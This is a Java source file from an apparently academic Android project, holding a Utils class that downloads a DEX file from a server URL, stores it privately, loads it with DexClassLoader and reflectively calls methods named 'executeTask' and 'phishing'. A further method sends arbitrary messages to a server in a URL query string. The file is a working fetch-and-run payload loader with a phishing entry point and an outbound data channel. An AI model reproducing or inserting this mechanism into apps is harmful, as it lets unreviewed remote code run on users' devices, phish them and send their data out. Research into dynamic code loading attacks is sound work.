package edu.ntu.android.learning.dynamicactivitychange;

import android.content.Context;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Enumeration;
import java.util.Map;

import dalvik.system.DexClassLoader;
import dalvik.system.DexFile;
//import javassist.*;

/**
 * Created by pillar on 4/1/2016.
 */
public class Utils {

    public static final String TAG = Utils.class.getName();

    public static String executeTask(Context context, String urlString, Map<String, String> features) {
        URL url = null;
        HttpURLConnection urlConn = null;
        try {
            url = new URL(urlString + "?feature="/* + featureId*/);
            urlConn = (HttpURLConnection) url.openConnection();
            InputStream in = new BufferedInputStream(urlConn.getInputStream());
            byte[] buffer = new byte[65536];
            FileOutputStream fos = context.openFileOutput("a.dex", context.MODE_PRIVATE);
            int len;
            while ((len = in.read(buffer)) != -1) {
                fos.write(buffer, 0, len);

            }
            fos.close();
            in.close();

            /*DexFile dx = DexFile.loadDex(context.getFilesDir().getAbsolutePath()+"/a.dex", File.createTempFile("opt", "dex", context.getCacheDir()).getPath(), 0);
            for (Enumeration<String> classNames = dx.entries(); classNames.hasMoreElements();){
                String className = classNames.nextElement();
                Log.d("+++++++++++", String.format("class: %s", className));
            }*/
            DexClassLoader loader = new DexClassLoader(context.getFilesDir().getAbsolutePath()+"/a.dex", context.getDir("outdex", Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());
            Class clz = loader.loadClass("Task");
            Object obj = clz.newInstance();
            Method mtd = clz.getDeclaredMethod("executeTask", new Class[]{Context.class});
            Object message = mtd.invoke(obj, context);
            return message.toString();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (urlConn != null)
                urlConn.disconnect();
        }
        return null;
    }

    public static void phishing(Context context) {
        try {
            DexClassLoader loader = new DexClassLoader(context.getFilesDir().getAbsolutePath() + "/a.dex", context.getDir("outdex", Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());
            Class clz = loader.loadClass("Task");
            Object obj = clz.newInstance();
            Method mtd = clz.getDeclaredMethod("phishing", new Class[]{Context.class});
            mtd.invoke(obj, context);
        }catch (Exception ex){
            Log.e(TAG, ex.getMessage());
        }
    }
    public static Class<?> queryServer(Context context, String urlString, int featureId) {
        URL url = null;
        HttpURLConnection urlConn = null;
        try {
            Log.d("++++++++++++++","Start to download the jar file");
            url = new URL(urlString + "?feature=" + featureId);
            urlConn = (HttpURLConnection) url.openConnection();
            InputStream in = new BufferedInputStream(urlConn.getInputStream());
            byte[] buffer = new byte[65536];
            FileOutputStream fos = context.openFileOutput("a.dex", context.MODE_PRIVATE);
            int len;
            while ((len = in.read(buffer)) != -1) {
                fos.write(buffer, 0, len);
            }
            fos.close();
            in.close();
            Log.d("+++++++++", "Store the jar into a.jar");

            DexFile dx = DexFile.loadDex(context.getFilesDir().getAbsolutePath()+"/a.dex", File.createTempFile("opt", "dex", context.getCacheDir()).getPath(), 0);
            for (Enumeration<String> classNames = dx.entries(); classNames.hasMoreElements();){
                String className = classNames.nextElement();
                Log.d("+++++++++++", String.format("class: %s", className));
            }
            DexClassLoader loader = new DexClassLoader(context.getFilesDir().getAbsolutePath()+"/a.dex", context.getDir("outdex", Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());
            Class clz = loader.loadClass("Task");
            Object obj = clz.newInstance();
            Method mtd = clz.getDeclaredMethod("executeTask", new Class[]{Context.class});
            Object message = mtd.invoke(obj, context);
            Log.d("++++++++++", obj.toString());
            Log.d("++++++++++", message.toString());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (urlConn != null)
                urlConn.disconnect();
        }
        return null;
    }

     public static void queryServer(String urlString, String message){
         try {
             URL url = new URL(urlString + "?mess=" + message);
             HttpURLConnection httpConn = (HttpURLConnection)url.openConnection();
             httpConn.connect();
         }catch(Exception ex){

         }
     }


}
